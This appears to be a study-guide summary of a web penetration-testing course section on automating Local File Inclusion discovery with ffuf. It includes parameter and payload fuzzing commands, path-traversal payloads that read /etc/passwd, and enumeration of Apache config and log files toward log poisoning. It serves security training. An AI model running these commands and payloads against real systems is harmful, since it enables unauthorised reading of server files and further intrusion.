This section covers how to **automate LFI discovery and enumeration** while understanding why manual testing is still important. The key idea is that automated tools can quickly identify common LFI cases, but custom vulnerabilities and unusual filtering often still require manual analysis.

![Image](https://images.openai.com/static-rsc-4/baiUClTdo8lRArB6q4yjeLDnYdqujDrIfnh9SDdl1dbP13tMXVPvmopE_prP8obKMdcx_bqgnC4wOKeQ_S6t2lHJion4OA6fymTObIEIMDojI6r33HdPTjH1qzu5nei57AptXap806Kqfz37rsCWMRFkYkaYNdClxn1yhSXOrC6W-NNpqmpAsMNA-W346uh0?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/pCfga3jg2776NCvoqxuYLpUS4gVeo6P-kPqlR6dmyJnStIGxJX73ry_F0RY_aJmz6oDdu9JTpp-MkfQb76TMLoPCyb3E5ZZ8Auvkh8Kj4rJXbiYSGi33BnCgFzmxcL6iMaHxQTgedAypkcR2_AtYTMiPMidqnsa90VN8J6qGYQ_r5ELfUQEHSpLPZRCiAk9a?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/ryq_mVqawdU13daH5PAAUDAWvJAMZyPhF835rJ5mYugD8oZiqoddFSyMfQAC0kiUTgRaBthlQj9FxIyixCoGVXzhHf_UDiki31_YoO_yGQPucbf7QElIYuJ2xTBgk6-sKhgG3evYL3-C2qBzZHgYnrIF5fTQMzqU6oxnt1m-SJaDIRXM_Fy1c7mEPJAKuHbt?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/VZE95xIA7HtamTbVn1Lnlz9Qfnp7d5QGTUOSUTlT-1R9uRXoqHtHn96JzWaPIaatpZe8AE3Tf-BQ2KBs7KztOuDtmDEmAp-EVgmWsW7gZIwy6UQ60EcFjphP7JAwcbwCgTj_xrJIKQBpa2LcVxBlPrVb1I_UFMyCrfzETIQpcwlBhAnqaDw-9Svvc9ewu-By?purpose=fullsize)

---

# 🧠 1. Why Automated Scanning?

LFI exploitation often requires **custom payloads** depending on:

- Application configuration
    
- Backend language/framework
    
- Input filters
    
- WAF rules
    
- Firewall restrictions
    
- File paths
    
- Available server files
    

Therefore, understanding **manual exploitation** remains essential. Automated tools are useful for quickly testing large numbers of common payloads.

### Think of it like this:

```text
Manual Testing
     │
     ├── Better understanding
     ├── Custom payloads
     ├── Bypass filters
     └── Find unusual cases
     
Automated Scanning
     │
     ├── Fast
     ├── Large wordlists
     ├── Common payloads
     └── Quick enumeration
```

### ⭐ Important

> **Automation saves time; manual testing provides depth.**

---

# 🔎 2. Fuzzing Parameters

One of the first things to investigate is **hidden/exposed parameters**.

A web application may have parameters that:

- aren't displayed in HTML forms
    
- aren't linked from the frontend
    
- aren't normally used by ordinary users
    
- may therefore have weaker security controls
    

The material emphasizes that exposed parameters can potentially be vulnerable not only to LFI but also to other web vulnerabilities.

---

# 🎯 3. Parameter Fuzzing With FFUF

A common parameter-name wordlist is:

```text
/opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

Example:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

### Breaking the command down

```text
-w
```

Specifies the wordlist.

```text
FUZZ
```

The position where FFUF substitutes each word from the wordlist.

```text
-u
```

Specifies the target URL.

So:

```text
index.php?FUZZ=value
```

becomes something like:

```text
index.php?language=value
index.php?page=value
index.php=file=value
...
```

---

# 🧩 4. Understanding the FFUF Output

A successful discovery might look like:

```text
language [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

This tells us that:

```text
language
```

is potentially an exposed parameter.

The next step is **not automatically assuming it's LFI**.

Instead:

```text
Parameter discovered
       ↓
Test parameter
       ↓
Try LFI payloads
       ↓
Verify behavior
```

The source specifically recommends performing the LFI tests discussed throughout the module once an exposed parameter has been discovered.

---

# 💡 5. Why Hidden Parameters Matter

Imagine:

```text
Normal frontend
      ↓
?id=
?page=
?search=
```

But the backend also accepts:

```text
?language=
```

even though the frontend doesn't expose it.

That hidden parameter may have weaker validation.

Therefore:

> **Don't restrict your testing to parameters visible in HTML forms.**

---

# ⭐ Tip — Popular LFI Parameters

For a more targeted scan, the material recommends limiting the scan to known/common LFI parameter names.

Examples conceptually include parameters related to:

```text
language
page
file
path
include
template
```

The provided material specifically points to HackTricks' list of common LFI parameters for a more precise scan.

---

# 📚 6. LFI Wordlists

After finding a parameter, the next question is:

> **Can we automatically test hundreds of LFI payloads against it?**

Yes.

A useful wordlist is:

```text
LFI-Jhaddix.txt
```

from SecLists.

It contains:

- common LFI payloads
    
- traversal variations
    
- encoding variations
    
- common files
    
- bypass techniques
    

---

# 💻 7. Fuzzing LFI Payloads With FFUF

Example from the material:

```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

The structure is:

```text
LFI Wordlist
     ↓
   FUZZ
     ↓
?language=FUZZ
     ↓
Every payload is tested
```

---

# 🔥 8. What Can the Wordlist Find?

The example output identifies multiple successful payloads, including variations such as:

```text
../../../../etc/passwd
```

and encoded traversal variants such as:

```text
..%2F..%2F..%2Fetc/passwd
```

It also finds variations with different traversal depths and encoding approaches.

This is especially useful because a filter might block one payload while another variation succeeds.

---

# ⚠️ 9. Automation Does NOT Mean Finished

This is extremely important.

Suppose FFUF returns:

```text
../../../../etc/passwd [Status: 200]
```

That is **evidence**, not the final verification.

The material explicitly says to:

1. Identify successful payloads.
    
2. Manually test them.
    
3. Verify that the expected file content is actually returned.
    

### Correct workflow:

```text
FFUF finds candidate
       ↓
Manually reproduce
       ↓
Check response
       ↓
Confirm included file
       ↓
Continue exploitation
```

---

# 🗂️ 10. Fuzzing Server Files

LFI isn't only useful for reading `/etc/passwd`.

There are many server-side files that can reveal valuable information.

Three particularly important categories are:

```text
1. Server webroot
2. Server configuration
3. Server logs
```

Think:

```text
LFI
 │
 ├── Webroot
 │
 ├── Configurations
 │
 └── Logs
```

---

# 🌐 11. Discovering the Server Webroot

Knowing the server's **absolute webroot path** can become important when relative traversal isn't sufficient.

For example, suppose you uploaded:

```text
shell.gif
```

but cannot reach:

```text
/uploads/shell.gif
```

using relative traversal.

If you discover:

```text
/var/www/html/
```

you may instead be able to reason about the file's absolute location.

---

# 📁 12. Webroot Wordlists

The material identifies dedicated wordlists for discovering common webroot directories:

### Linux

```text
default-web-root-directory-linux.txt
```

### Windows

```text
default-web-root-directory-windows.txt
```

These can be used to test likely webroot locations.

---

# 💻 13. FFUF Webroot Discovery

Example:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

### How it works

FFUF substitutes:

```text
FUZZ
```

with possible webroot directories:

```text
/var/www/
/var/www/html/
/srv/www/
/...
```

The request becomes:

```text
../../../../<candidate>/index.php
```

If one produces the expected behavior, you've potentially identified the webroot.

---

# 🎯 14. Example Result

The material's example discovers:

```text
/var/www/html/
```

This gives:

```text
Webroot = /var/www/html/
```

Now you have a much clearer understanding of the application filesystem.

---

# 🧠 15. Another Method: LFI-Jhaddix

The same:

```text
LFI-Jhaddix.txt
```

wordlist can sometimes reveal webroot information as well.

If that doesn't work, the material recommends reading server configuration files because they frequently contain:

- webroot path
    
- log locations
    
- other server information
    

This demonstrates an important enumeration principle:

> **Use one discovered file to find the location of another useful file.**

---

# 📝 16. Configuration & Log Discovery

Server configuration files are extremely valuable because they can reveal paths that aren't obvious from the application itself.

For example:

```text
LFI
 ↓
Apache configuration
 ↓
DocumentRoot
 ↓
Webroot
```

And:

```text
Apache configuration
 ↓
ErrorLog / CustomLog
 ↓
Log location
```

The material specifically highlights the importance of finding the correct logs directory for log poisoning.

---

# 🔥 17. Precise LFI Wordlist

For more comprehensive Linux enumeration, the material uses:

```text
LFI-WordList-Linux
```

and for Windows:

```text
LFI-WordList-Windows
```

These are more focused on LFI-related files and paths than a generic directory list.

---

# 💻 18. Fuzzing Server Files

Example:

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

The scan can reveal files such as:

```text
/etc/hosts
/etc/hostname
/etc/login.defs
/etc/fstab
/etc/apache2/apache2.conf
/etc/issue.net
/etc/apache2/mods-enabled/status.conf
/etc/apache2/mods-enabled/alias.conf
/etc/apache2/envvars
/etc/adduser.conf
```

---

# ⭐ 19. Why Configuration Files Are Gold

A configuration file can give you **new enumeration paths**.

For example, reading:

```text
/etc/apache2/apache2.conf
```

reveals:

```text
ServerAdmin webmaster@localhost
DocumentRoot /var/www/html

ErrorLog ${APACHE_LOG_DIR}/error.log
CustomLog ${APACHE_LOG_DIR}/access.log combined
```

Immediately, you've learned:

```text
Webroot
   ↓
/var/www/html

Error log
   ↓
${APACHE_LOG_DIR}/error.log

Access log
   ↓
${APACHE_LOG_DIR}/access.log
```

---

# 🧩 20. Understanding Apache Variables

Notice:

```text
${APACHE_LOG_DIR}
```

is a variable rather than the actual directory.

So we need to find its value.

The material identifies:

```text
/etc/apache2/envvars
```

as the relevant file.

---

# 🔎 21. Reading `/etc/apache2/envvars`

The relevant configuration contains:

```text
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
```

Therefore:

```text
APACHE_LOG_DIR
      ↓
/var/log/apache2
```

Combined with the previous configuration:

```text
access.log
      ↓
/var/log/apache2/access.log

error.log
      ↓
/var/log/apache2/error.log
```

---

# 🧠 22. The Enumeration Chain

This is one of the most useful concepts in this section:

```text
LFI
 │
 ▼
apache2.conf
 │
 ├───────────────┐
 ▼               ▼
DocumentRoot   APACHE_LOG_DIR
 │               │
 ▼               ▼
/var/www/html   envvars
                 │
                 ▼
            /var/log/apache2
                 │
          ┌──────┴──────┐
          ▼             ▼
      access.log     error.log
```

So instead of blindly guessing everything, you can **follow information revealed by previously discovered files**.

---

# 🔥 23. Manual Enumeration vs Wordlists

The material makes an important distinction.

### Wordlists

Advantages:

- Fast
    
- Large coverage
    
- Can identify many files
    
- Useful for initial enumeration
    

### Manual analysis

Advantages:

- Understand relationships between files
    
- Discover paths not present in wordlists
    
- Follow variables
    
- Identify application-specific information
    
- Build a clearer picture of the server
    

The source explicitly demonstrates manually reading configuration files to discover further paths and information.

---

# 🛠️ 24. LFI Tools

There are specialized tools that automate much of the LFI process.

The material names:

### LFISuite

### LFiFreak

### liffy

These tools can automate things such as:

```text
LFI detection
Payload testing
File enumeration
Potential exploitation
```

---

# ⚠️ 25. Major Problem With Automated LFI Tools

Many of these tools are:

- poorly maintained
    
- outdated
    
- dependent on Python 2
    

The material therefore warns that they are not necessarily a good long-term solution.

### Key lesson:

> **Know how to perform the attack manually before relying on automation.**

---

# 🧪 26. Complete Automated LFI Workflow

Here's the entire section condensed into one methodology:

```text
                 TARGET
                    │
                    ▼
          Find exposed parameters
                    │
                    ▼
            Parameter fuzzing
                    │
                    ▼
              Find candidate
                    │
                    ▼
             LFI wordlist
                    │
                    ▼
          Identify working payload
                    │
                    ▼
            Manually verify
                    │
                    ▼
        Enumerate server files
                    │
          ┌─────────┼─────────┐
          ▼         ▼         ▼
       Webroot    Configs    Logs
          │         │         │
          └─────────┼─────────┘
                    ▼
             Read useful files
                    │
                    ▼
        Follow discovered paths
                    │
                    ▼
          Continue exploitation
```

---

# 🎯 27. What to Look for During Enumeration

When you successfully read a file, don't just read it and move on.

Ask:

### 📌 "What new information did this file give me?"

For example:

```text
apache2.conf
      ↓
DocumentRoot
      ↓
/var/www/html
```

Then:

```text
apache2.conf
      ↓
APACHE_LOG_DIR
      ↓
envvars
      ↓
/var/log/apache2
```

Then:

```text
/var/log/apache2
      ↓
access.log
error.log
```

This creates an **enumeration chain**.

---

# 🚨 28. Important FFUF Concepts

### `-w`

Wordlist:

```text
-w <wordlist>:FUZZ
```

### `-u`

Target URL:

```text
-u '<URL>'
```

### `FUZZ`

Replacement position.

### `-fs`

Filter responses by size:

```text
-fs 2287
```

This is useful when the application returns the same response size for unsuccessful requests.

The examples in the material repeatedly use response-size filtering to remove the normal baseline response.

---

# 🧠 29. Three Wordlists to Remember

|Purpose|Wordlist|
|---|---|
|Parameter discovery|`burp-parameter-names.txt`|
|Common LFI payloads|`LFI-Jhaddix.txt`|
|Linux LFI/server files|`LFI-WordList-Linux`|
|Windows LFI/server files|`LFI-WordList-Windows`|
|Linux webroot discovery|`default-web-root-directory-linux.txt`|
|Windows webroot discovery|`default-web-root-directory-windows.txt`|

These correspond to the enumeration techniques described in the source.

---

# 🔴 30. MOST IMPORTANT THINGS TO MEMORIZE

### 1️⃣ Don't only test visible parameters

Hidden parameters can have weaker security controls.

### 2️⃣ Use parameter fuzzing first

```text
Parameter names → FFUF
```

### 3️⃣ Then test LFI payloads

```text
LFI-Jhaddix.txt
```

### 4️⃣ Always manually verify

A `200` response alone does **not** prove LFI.

### 5️⃣ Enumerate server files

Focus on:

```text
Webroot
Configs
Logs
```

### 6️⃣ Configuration files reveal more paths

For example:

```text
apache2.conf
      ↓
DocumentRoot
      ↓
APACHE_LOG_DIR
```

### 7️⃣ Follow discovered information

Don't blindly fuzz everything.

### 8️⃣ Automation isn't a replacement for understanding

Automated LFI tools can miss vulnerabilities and may be outdated.

---

# ⚡ 30-Second Revision

```text
             AUTOMATED LFI
                   │
       ┌───────────┴───────────┐
       ▼                       ▼
 Parameter Fuzzing         LFI Fuzzing
       │                       │
       ▼                       ▼
 Find hidden params       LFI wordlist
       │                       │
       └───────────┬───────────┘
                   ▼
             Manual Verify
                   │
                   ▼
          Server File Fuzzing
                   │
       ┌───────────┼───────────┐
       ▼           ▼           ▼
    Webroot      Configs      Logs
       │           │           │
       └───────────┼───────────┘
                   ▼
        Follow discovered paths
                   │
                   ▼
             Further LFI
             enumeration
```

## 🏆 Golden Takeaway

> **Use automation to find candidates quickly, but use manual analysis to understand and exploit the vulnerability accurately.**

The strongest workflow is:

**Parameter discovery → LFI payload fuzzing → manual verification → webroot/config/log enumeration → follow information revealed by discovered files.**